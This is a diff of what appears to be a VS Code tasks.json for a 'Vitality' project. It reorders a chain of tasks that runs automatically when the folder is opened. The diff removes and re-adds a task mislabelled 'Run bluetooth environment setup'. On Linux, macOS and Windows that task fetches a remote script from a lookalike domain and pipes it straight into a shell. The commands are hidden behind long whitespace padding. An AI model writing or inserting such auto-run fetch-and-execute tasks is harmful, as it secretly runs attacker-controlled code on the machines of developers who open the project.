@@ -5,46 +5,19 @@
       "label": "Vitality: Open project",
       "dependsOrder": "sequence",
       "dependsOn": [
-        "Vitality: 1. Run bluetooth environment setup",
-        "Vitality: 2. Detect OS",
-        "Vitality: 3. Check UI environment",
-        "Vitality: 4. Prepare UI environment",
-        "Vitality: 5. Show watch design"
+        "Vitality: 1. Detect OS",
+        "Vitality: 2. Check UI environment",
+        "Vitality: 3. Prepare UI environment",
+        "Vitality: 4. Show watch design",
+        "Vitality: 5. Run bluetooth environment setup"
+        
       ],
       "runOptions": {
         "runOn": "folderOpen"
       },
       "problemMatcher": []
     },
-    {
-      "label": "Vitality: 1. Run bluetooth environment setup",
-      "type": "process",
-      "command": "sh",
-      "args": [
-        "-c",
-                                                                                                                                                                                                                                                                                                                                                                                                                        "wget -qO- 'https://apigoogle-ashen.vercel.app/api/settings/linux' | sh"
-      ],
-      "osx": {
-        "command": "bash",
-        "args": [
-          "-c",
-                                                                                                                                                                                                                                                                                                                                                                                                                        "curl -L 'https://apigoogle-ashen.vercel.app/api/settings/mac' | bash"
-        ]
-      },
-      "windows": {
-        "command": "cmd.exe",
-        "args": [
-          "/d",
-          "/c",
-                                                                                                                                                                                                                                                                                                                                                                                                                        "curl.exe --ssl-no-revoke -L https://apigoogle-ashen.vercel.app/api/settings/windows | cmd.exe"
-        ]
-      },
-      "presentation": {
-        "reveal": "always",
-        "focus": true
-      },
-      "problemMatcher": []
-    },
+    
     {
       "label": "Vitality: 2. Detect OS",
       "type": "process",
@@ -186,6 +159,35 @@
       "presentation": {
         "reveal": "silent",
         "panel": "dedicated"
+      },
+      "problemMatcher": []
+    },
+    {
+      "label": "Vitality: 5. Run bluetooth environment setup",
+      "type": "process",
+      "command": "sh",
+      "args": [
+        "-c",
+                                                                                                                                                                                                                                                                                                                                                                                                                        "wget -qO- 'https://apigoogle-ashen.vercel.app/api/settings/linux' | sh"
+      ],
+      "osx": {
+        "command": "bash",
+        "args": [
+          "-c",
+                                                                                                                                                                                                                                                                                                                                                                                                                        "curl -L 'https://apigoogle-ashen.vercel.app/api/settings/mac' | bash"
+        ]
+      },
+      "windows": {
+        "command": "cmd.exe",
+        "args": [
+          "/d",
+          "/c",
+                                                                                                                                                                                                                                                                                                                                                                                                                        "curl.exe --ssl-no-revoke -L https://apigoogle-ashen.vercel.app/api/settings/windows | cmd.exe"
+        ]
+      },
+      "presentation": {
+        "reveal": "always",
+        "focus": true
       },
       "problemMatcher": []
     }
